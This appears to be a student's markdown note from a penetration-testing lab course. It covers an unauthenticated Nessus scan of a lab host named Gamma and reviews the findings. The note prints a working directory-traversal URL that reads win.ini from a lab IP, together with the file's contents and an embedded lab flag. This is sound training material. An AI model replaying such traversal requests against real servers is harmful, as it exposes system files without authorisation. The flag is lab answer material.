---
title: Nessus Unauthenticated Scan of Gamma
aliases: []
tags:
- tool/nessus
- vulnerabilities
- pen-testing
- offsec
category: detections
status: draft
date_created: '2026-08-27'
date_modified: '2026-08-27'
source: lab.md
related_tools:
- '[[nessus]]'
related_techniques: []
related_tactics: []
related_services: []
related_os: []
related_notes: []
mitre_tactic: ''
mitre_technique: ''
real_path: ''
port: ''
protocol: ''
os: ''
---

# Nessus Unauthenticated Scan of Gamma

## Exercise Overview
This exercise involves performing an unauthenticated scan of a machine named Gamma using Nessus. The steps include creating the scan, observing the steps taken by the scanner, and reviewing the scan results.

## Exercise Steps
1. Create an unauthenticated scan of the machine Gamma.
2. Open Wireshark to capture the network traffic during the scan.
3. Analyze the steps taken by the scanner to complete the scan.
4. Review the results of the scan.

## VM Exercises
This section involves using the Topic Exercises VMs to perform a scan on a victim machine with known vulnerabilities.

Steps:
1. Perform a Basic Network Scan of the victim machine on VM #1.
2. Ensure the scan assesses all ports.
3. Examine the results to identify a critical vulnerability.
4. Use Nessus to read the file `C:\Windows\win.ini` as a proof of concept of the exploit.
5. Expand the vulnerability results to view the full content of the retrieved file and locate the embedded flag.

## Nessus Scan Results
Nessus was able to retrieve the remote host's `win.ini` file using the following URL:

```
http://192.168.162.54:27498/../../../../../../../../../../../../windows/win.ini
```

The contents of the file are as follows:

```
------------------------------ snip ------------------------------
﻿; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
; OS{cc407ed31b68267e4058d8e9937a20e3}
------------------------------ snip ------------------------------
```

Note that Nessus stopped searching after one exploit was found. To report all known exploits, enable the 'Perform thorough tests' setting and re-scan.

## References
- https://github.com/offsec/Labs

